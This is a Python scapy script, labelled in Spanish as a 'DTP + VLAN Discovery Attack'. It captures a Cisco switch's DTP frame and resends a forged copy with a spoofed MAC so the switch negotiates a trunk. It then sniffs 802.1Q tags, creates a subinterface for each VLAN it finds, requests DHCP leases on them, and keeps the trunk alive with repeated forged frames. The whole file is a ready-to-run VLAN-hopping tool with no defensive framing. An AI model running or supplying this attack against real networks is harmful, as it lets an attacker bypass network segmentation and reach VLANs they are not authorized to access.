#!/usr/bin/env python3
from scapy.all import sniff, sendp, load_contrib, Dot1Q

load_contrib("dtp")
import time, sys, subprocess, os, threading

IFACE = "eth0"
INTERVALO = 5
SNIFF_TIME = 30
DTP_TIMEOUT = 60

ctx = {
    "iface": IFACE,
    "mac_switch": None,
    "dominio": None,
    "pkt_dtp": None,
    "trunk_activo": False,
    "vlans": {},
}
vlans_detectadas = ctx["vlans"]


def banner():
    print("\n" + "═" * 50)
    print("  DTP + VLAN Discovery Attack")
    print(f"  Interfaz : {IFACE} | Sniffeo: {SNIFF_TIME}s")
    print("═" * 50 + "\n")


def capturar_dtp():
    print("[*] Esperando trama DTP del switch...")
    pkts = sniff(
        filter="ether dst 01:00:0c:cc:cc:cc", count=1, iface=IFACE, timeout=DTP_TIMEOUT
    )
    if not pkts:
        sys.exit("[-] No se capturó DTP.")
    return pkts[0]


def negociar_trunk(pkt):
    mac_switch = pkt.src
    print(f"[+] Switch detectado  : {mac_switch}")
    try:
        dominio = pkt[DTPDomain].domain.decode(errors="ignore").strip("\x00")
        print(f"[+] Dominio DTP       : {dominio}")
    except Exception:
        dominio = "desconocido"

    pkt.src = "00:00:00:11:11:11"
    try:
        pkt[DTPNeighbor].neighbor = b"\x00\x00\x00\x11\x11\x11"
        pkt[DTPStatus].status = b"\x03"
        pkt[DTPType].dtptype = b"E"
    except Exception as e:
        print(f"[!] Advertencia: {e}")

    print("[*] Enviando trama DTP maliciosa...")
    sendp(pkt, iface=IFACE, verbose=False)
    print("[*] Esperando negociación trunk (10s)...")
    time.sleep(10)

    ctx["mac_switch"] = mac_switch
    ctx["dominio"] = dominio
    ctx["pkt_dtp"] = pkt
    return pkt, mac_switch, dominio


def verificar_trunk():
    print("[*] Verificando trunk (3s)...")
    r = subprocess.run(
        ["timeout", "3", "tcpdump", "-i", IFACE, "-e", "-c", "10", "-q"],
        capture_output=True,
        text=True,
    )
    if "802.1Q" in r.stdout or "802.1Q" in r.stderr:
        print("[+] ¡Trunk confirmado!")
        ctx["trunk_activo"] = True
        return True
    print("[!] No se detectaron tramas 802.1Q aún")
    return False


def sniff_vlans(pkt):
    if pkt.haslayer(Dot1Q):
        vid = pkt[Dot1Q].vlan
        if vid not in vlans_detectadas:
            proto = pkt.payload.name if hasattr(pkt.payload, "name") else "desconocido"
            vlans_detectadas[vid] = proto
            print(f"  [+] VLAN {vid:<5} descubierta   protocolo: {proto}")


def descubrir_vlans():
    print(f"\n[*] Sniffeando 802.1Q durante {SNIFF_TIME}s...")
    sniff(iface=IFACE, prn=sniff_vlans, timeout=SNIFF_TIME, store=False)


def unirse_vlans():
    if not vlans_detectadas:
        print("\n[!] Sin VLANs detectadas. Usa comandos manuales.")
        return
    print(f"\n[*] Creando subinterfaces para {len(vlans_detectadas)} VLAN(s)...")
    for vid in sorted(vlans_detectadas):
        iface_vlan = f"{IFACE}.{vid}"
        os.system(
            f"ip link add link {IFACE} name {iface_vlan} type vlan id {vid} 2>/dev/null"
        )
        os.system(f"ip link set {iface_vlan} up 2>/dev/null")
        print(f"  [+] {iface_vlan} creada — solicitando DHCP...")
        os.system(f"timeout 8 dhclient -1 {iface_vlan} 2>/dev/null &")
    time.sleep(10)


def resumen(mac_switch, dominio):
    print("\n" + "═" * 50)
    print(f"  Switch: {mac_switch}  |  Dominio: {dominio}")
    if vlans_detectadas:
        print(f"\n  {'ID':<8} {'Protocolo':<20} {'Subinterfaz'}")
        for vid in sorted(vlans_detectadas):
            print(f"  {vid:<8} {vlans_detectadas[vid]:<20} {IFACE}.{vid}")
    print("\n  IPs obtenidas:")
    os.system("ip -4 addr show | grep 'inet ' | grep -v '127.0.0.1'")
    print("═" * 50)


def iniciar_keepalive_background(pkt):
    """Keepalive no bloqueante — para cuando se importa desde otro script"""

    def _loop():
        while True:
            sendp(pkt, iface=IFACE, verbose=False)
            time.sleep(INTERVALO)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    print(f"[*] Keepalive DTP en background (cada {INTERVALO}s)")


def keepalive(pkt):
    """Keepalive bloqueante — para cuando se corre solo"""
    print(f"\n[*] Trunk activo (cada {INTERVALO}s) — Ctrl+C para detener\n")
    count = 0
    try:
        while True:
            sendp(pkt, iface=IFACE, verbose=False)
            count += 1
            print(f"\r[*] Keepalives: {count}", end="", flush=True)
            time.sleep(INTERVALO)
    except KeyboardInterrupt:
        print(f"\n[+] Detenido. Total: {count}")


def get_context():
    return ctx


def run():
    banner()
    pkt_original = capturar_dtp()
    pkt_mod, mac, dominio = negociar_trunk(pkt_original)
    verificar_trunk()
    descubrir_vlans()
    unirse_vlans()
    resumen(mac, dominio)
    return pkt_mod, mac, dominio


if __name__ == "__main__":
    pkt_mod, mac, dominio = run()
    keepalive(pkt_mod)
